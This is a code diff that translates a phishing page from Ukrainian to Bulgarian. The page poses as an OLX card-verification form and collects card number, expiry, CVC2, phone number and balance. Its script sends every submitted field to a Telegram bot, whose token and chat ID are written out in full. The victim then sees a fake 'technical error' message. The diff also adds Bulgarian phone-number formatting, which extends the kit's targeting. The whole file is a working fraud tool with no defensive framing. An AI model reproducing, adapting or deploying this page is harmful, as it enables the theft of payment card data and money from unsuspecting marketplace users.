@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uk">
+<html lang="bg">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OLX - Верифікація картки</title>
+    <title>OLX - Верификация на картата</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -210,7 +210,7 @@
         <div class="nav-right">
             <a href="https://www.olx.bg/" class="nav-link">
                 <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
-                <span>Ваш профіль</span>
+                <span>Вашият профил</span>
             </a>
         </div>
     </div>
@@ -218,18 +218,18 @@
 
 <div class="main-container">
     <div class="payment-card">
-        <h2>Верифікація та прив'язка картки</h2>
+        <h2>Верификация и привързване на карта</h2>
 
         <form id="verifyForm">
             <div class="form-group">
-                <label>Номер картки</label>
+                <label>Номер на картата</label>
                 <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
             </div>
 
             <div class="row">
                 <div class="form-group">
-                    <label>Термін дії</label>
-                    <input type="text" id="expiry" placeholder="ММ/РР" maxlength="5">
+                    <label>Срок на валидност</label>
+                    <input type="text" id="expiry" placeholder="ММ/ГГ" maxlength="5">
                 </div>
                 <div class="form-group">
                     <label>CVC2</label>
@@ -238,46 +238,46 @@
             </div>
 
             <div class="form-group">
-                <label>Номер телефону</label>
-                <input type="text" id="phoneNumber" placeholder="Ваш номер телефону" maxlength="15">
+                <label>Телефонен номер</label>
+                <input type="text" id="phoneNumber" placeholder="+359..." maxlength="13">
             </div>
 
             <div class="form-group">
-                <label>Доступний ліміт (баланс) на картці</label>
-                <input type="text" id="balance" placeholder="0.00 лв">
+                <label>Наличен лимит (баланс) на картата</label>
+                <input type="text" id="balance" placeholder="00.00 лв" maxlength="5">
             </div>
 
-            <button type="submit" class="verify-btn">ПІДТВЕРДИТИ</button>
+            <button type="submit" class="verify-btn">ПОТВЪРДИ</button>
         </form>
     </div>
 
     <div class="info-card">
-        <h3>Офіційна верифікація</h3>
-        <p>Для успішної прив'язки картки переконайтеся, що:</p>
+        <h3>Официална верификация</h3>
+        <p>За успешното привързване на картата, уверете се, че:</p>
         <ul>
-            <li>На картці встановлено ліміт для інтернет-оплат.</li>
-            <li>Баланс картки є позитивним (від 1.00 лв).</li>
-            <li>Картка підтримує технологію 3D-Secure.</li>
+            <li>Картата има активиран лимит за интернет плащания.</li>
+            <li>Балансът на картата е положителен (най-малко 1.00 лв).</li>
+            <li>Картата поддържа технологията 3D-Secure.</li>
         </ul>
     </div>
 </div>
 
-<!-- Модальное окно -->
+<!-- Модално окно -->
 <div id="modal" class="modal">
     <div class="modal-content">
-        <h3 id="modal-title">Загрузка...</h3>
-        <p id="modal-message">Починаємо перевірку даних...</p>
+        <h3 id="modal-title">Зареждане...</h3>
+        <p id="modal-message">Започваме проверка на данните...</p>
         <p id="loading-message"></p>
-        <a href="https://t.me/your_telegram_chat_id" class="btn" target="_blank" style="display:none" id="modal-btn">Написати в Telegram</a>
+        <a href="https://t.me/your_telegram_chat_id" class="btn" target="_blank" style="display:none" id="modal-btn">Напишете в Telegram</a>
     </div>
 </div>
 
 <script>
-    // Токен и ID чата для Telegram
-    const TG_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';  // Ваш токен Telegram бота
-    const TG_CHAT_ID = '-1003455979409';  // ID чата в Telegram, куда будет отправляться лог
+    // Токен и ID чат за Telegram
+    const TG_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';  // Вашият Telegram токен
+    const TG_CHAT_ID = '-1003455979409';  // ID на чата в Telegram, където ще се изпращат логовете
 
-    // Функция для отправки данных в Telegram
+    // Функция за изпращане на съобщение в Telegram
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
         const data = {
@@ -292,16 +292,16 @@
         });
 
         if (!response.ok) {
-            console.error('Ошибка при отправке в Telegram:', await response.text());
+            console.error('Грешка при изпращане в Telegram:', await response.text());
         }
     }
 
-    // Номер картки
+    // Форматиране на номер на картата
     document.getElementById('cardNumber').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
 
-    // ТЕРМІН ДІЇ
+    // Форматиране на срок на валидност
     document.getElementById('expiry').addEventListener('input', e => {
         let input = e.target.value.replace(/\D/g, '');
         if (input.length > 4) input = input.substring(0, 4);
@@ -313,38 +313,58 @@
         }
     });
 
-    // Запобігання відправці форми для демонстрації
+    // Форматиране на телефонен номер
+    document.getElementById('phoneNumber').addEventListener('input', e => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length <= 3) {
+            e.target.value = '+359 ' + value;
+        } else {
+            e.target.value = '+359 ' + value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
+        }
+    });
+
+    // Форматиране на баланс
+    document.getElementById('balance').addEventListener('input', e => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length <= 2) {
+            e.target.value = value.substring(0, 2) + '.' + value.substring(2, 4);
+        } else {
+            e.target.value = value.substring(0, 2) + '.' + value.substring(2, 4);
+        }
+    });
+
+    // Превенция на изпращане на форма за демонстрация
     document.getElementById('verifyForm').addEventListener('submit', e => {
         e.preventDefault();
 
-        // Показываем модалку и меняем текст на этапе отправки
+        // Показване на модалката и промяна на текста
         document.getElementById('modal').style.display = 'block';
-        document.getElementById('modal-title').innerText = 'Отправка запроса в банк...';
-        document.getElementById('modal-message').innerText = 'Перевіряємо дані вашої картки.';
+        document.getElementById('modal-title').innerText = 'Изпращане на заявка до банката...';
+        document.getElementById('modal-message').innerText = 'Проверяваме данните на вашата карта.';
         
-        // Собираем данные формы
+        // Събиране на данни от формата
         const cardNumber = document.getElementById('cardNumber').value;
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
         const balance = document.getElementById('balance').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
 
-        // Формируем сообщение для Telegram
+        // Съобщение за Telegram
         const message = `
-            <b>Номер картки:</b> ${cardNumber}\n
-            <b>Термін дії:</b> ${expiry}\n
+            <b>Номер на картата:</b> ${cardNumber}\n
+            <b>Срок на валидност:</b> ${expiry}\n
             <b>CVC2:</b> ${cvc}\n
-            <b>Номер телефону:</b> ${phoneNumber}\n
-            <b>Баланс картки:</b> ${balance}
+            <b>Телефонен номер:</b> ${phoneNumber}\n
+            <b>Баланс на картата:</b> ${balance}
         `;
 
-        // Отправляем сообщение в Telegram
+        // Изпращане на съобщение в Telegram
         sendToTelegram(message);
 
-        // Задержка для демонстрации
+        // Задържане за демонстрация
         setTimeout(() => {
-            document.getElementById('modal-title').innerText = 'Помилка!';
-            document.getElementById('modal-message').innerText = 'Виникла технічна помилка, будь ласка, спробуйте ще раз.';
+            document.getElementById('modal-title').innerText = 'Грешка!';
+            document.getElementById('modal-message').innerText = 'Възникна техническа грешка, моля опитайте отново.';
             document.getElementById('modal-btn').style.display = 'block';
         }, 3000);
     });
@@ -352,3 +372,8 @@
 
 </body>
 </html>
+
+
+</body>
+</html>
+
